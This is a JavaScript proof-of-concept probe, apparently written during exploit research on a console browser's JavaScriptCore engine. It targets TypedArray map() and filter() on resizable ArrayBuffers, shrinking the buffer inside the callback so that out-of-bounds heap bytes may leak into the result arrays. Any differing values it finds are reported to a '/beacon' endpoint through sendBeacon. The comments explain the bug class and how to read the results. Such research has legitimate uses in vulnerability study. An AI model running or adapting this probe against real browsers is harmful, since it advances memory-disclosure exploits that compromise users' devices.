// c027: the same class as the TypedArray.from bug, in the methods upstream did NOT fix.
//
// TypedArrayPrototype.js as shipped in Sony's tree:
//   function map(callback, thisArg) {
//       var length = @typedArrayLength(this);      // cached, once
//       ...
//       for (var i = 0; i < length; i++)
//           var mappedValue = callback.@call(thisArg, this[i], i, this);   // this[i] read after the callback
//   }
// No in-loop re-check of @typedArrayLength(this) or @isDetached(this), which is precisely what the June 2026
// fix added to from(). So a callback that shrinks `this`'s resizable buffer leaves the loop reading past the
// end of the backing store for the remaining iterations, and map() copies whatever it read into the fresh
// result array - i.e. a JS-readable leak if the read is genuinely out of bounds.
//
// Whether it IS out of bounds depends on whether the element access uses a cached vector (IC/JIT) or reloads
// the length (interpreter). This build is LLInt-only, so the tail values decide it:
//   tail values == 0x41414141  -> access was bounds-checked (or the loop observed the shrink): no bug here
//   tail values != 0x41414141  -> out-of-bounds read, and the differing values are leaked heap bytes
(function () {
  var LOG = [];
  function note(s) { LOG.push(s); }
  function flush() { for (var i = 0; i < LOG.length; i++) { try { navigator.sendBeacon('/beacon', 'c027-' + LOG[i]); } catch (e) {} } }

  note('boot');
  var p; try { p = new ArrayBuffer(16, { maxByteLength: 64 }); } catch (e) { note('no-RAB:' + e.name); flush(); return; }
  if (typeof p.resize !== 'function') { note('no-resize'); flush(); return; }
  note('rab-ok');

  var FILL = 0x41414141;

  function mapProbe(tag, shrinkBytes, shrinkAt) {
    var rab = new ArrayBuffer(0x4000, { maxByteLength: 0x4000 });
    var ta = new Int32Array(rab);
    for (var i = 0; i < ta.length; i++) ta[i] = FILL;

    var calls = 0, threw = '', out;
    try {
      out = ta.map(function (v, idx) {
        if (idx === shrinkAt) rab.resize(shrinkBytes);
        calls++;
        return v;
      });
    } catch (e) { threw = e.name; }

    var kept = shrinkBytes === 0 ? 0 : shrinkBytes / 4;
    var bad = 0, zeros = 0, sample = [];
    if (out) {
      for (var k = kept; k < out.length; k++) {
        if (out[k] === 0) zeros++;
        else if (out[k] !== FILL) { bad++; if (sample.length < 6) sample.push(k + ':' + out[k]); }
      }
      if (zeros) sample.push('zeros=' + zeros);
    }
    note(tag + ' calls=' + calls + ' outLen=' + (out ? out.length : -1) +
         ' kept=' + kept + ' differing=' + bad +
         (sample.length ? ' [' + sample.join(' ') + ']' : '') + (threw ? ' threw:' + threw : ''));
  }

  mapProbe('MAP-shrink16-at0', 16, 0);
  mapProbe('MAP-shrink0-at0', 0, 0);
  mapProbe('MAP-shrink16-at2', 16, 2);

  // filter runs the predicate and then copies the element - same hazard, different sink
  try {
    var rab2 = new ArrayBuffer(0x4000, { maxByteLength: 0x4000 });
    var t2 = new Int32Array(rab2);
    for (var j = 0; j < t2.length; j++) t2[j] = FILL;
    var f = t2.filter(function (v, idx) { if (idx === 0) rab2.resize(16); return v !== 0; });
    var badF = 0, sampleF = [];
    for (var m = 0; m < f.length; m++) { if (f[m] !== FILL) { badF++; if (sampleF.length < 5) sampleF.push(m + ':' + f[m]); } }
    note('FILTER len=' + f.length + ' differing=' + badF + (sampleF.length ? ' [' + sampleF.join(' ') + ']' : ''));
  } catch (e) { note('FILTER threw:' + e.name); }

  note('done');
  flush();
})();
